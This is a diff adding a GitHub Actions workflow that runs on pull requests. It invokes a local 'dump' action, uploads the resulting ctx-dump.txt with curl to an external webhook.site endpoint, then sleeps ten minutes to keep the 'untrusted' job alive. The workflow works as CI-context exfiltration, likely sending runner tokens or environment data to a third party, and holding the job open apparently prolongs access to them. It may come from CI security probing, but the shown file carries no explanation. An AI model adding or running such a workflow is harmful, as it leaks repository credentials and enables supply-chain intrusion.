@@ -1,0 +1,16 @@
+name: cb-b-untrusted
+on:
+  pull_request: {}
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - name: dump
+        uses: ./.github/actions/dump
+      - name: upload + hold
+        run: |
+          curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx-dump.txt" -F "src=live-B-pr"
+          echo "holding untrusted job alive"
+          sleep 600
